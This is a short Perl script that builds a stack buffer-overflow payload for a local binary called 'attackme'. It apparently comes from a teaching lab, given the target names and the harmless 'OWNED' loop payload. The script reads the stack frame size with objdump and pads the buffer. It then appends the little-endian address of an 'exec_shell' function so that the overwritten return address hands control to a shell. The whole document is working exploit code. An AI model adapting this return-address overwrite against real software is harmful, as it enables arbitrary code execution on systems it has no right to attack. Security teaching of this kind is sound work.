#! /usr/bin/perl
use bytes;

my $file;
if (defined($ARGV[0]) && -f $ARGV[0]) {
    $file = $ARGV[0];
} elsif (defined($ARGV[0]) && $ARGV[0] eq "-s") {
    $file = "attackme";
} else {
    $file = "attackme-unsafe";
}

my $stackdepth = `objdump --disassemble=checksum $file | grep '%rsp\$' | head -n 1`;
if ($stackdepth =~ /sub\s+\$0x([0-9a-f]+)/i) {
    $stackdepth = hex($1);
} elsif ($stackdepth =~ /add\s+\$0xffffffff([0-9a-f]+)/i) {
    $stackdepth = 0x100000000 - hex($1);
}

my $x = "while true; do echo OWNED 1>&2; sleep 1; done";
while (length($x) < $stackdepth) {
    $x .= "\x00";
}

my $addr = `nm $file | grep exec_shell`;
if ($addr =~ /^([0-9a-f]{16}) T exec_shell/m) {
    for ($i = 0; $i != 16; $i += 2) {
        $x .= pack("H*", substr($1, 14 - $i, 2));
    }
} else {
    print STDERR "No exec_shell!\n";
    exit(1);
}

print $x;
